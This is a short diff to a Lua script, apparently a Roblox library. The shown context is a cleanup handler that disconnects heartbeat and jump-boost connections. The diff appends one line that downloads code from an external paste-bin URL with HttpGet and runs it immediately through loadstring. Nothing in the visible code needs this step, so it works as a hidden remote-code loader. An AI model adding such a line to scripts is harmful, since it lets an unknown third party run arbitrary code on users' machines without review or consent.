@@ -1179,3 +1179,4 @@ Lib.Destroying:Connect(function()
     if heartbeatConn then heartbeatConn:Disconnect() end
     if jumpBoostConn then jumpBoostConn:Disconnect() end
 end)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/37GFrdQcHv/0"))()
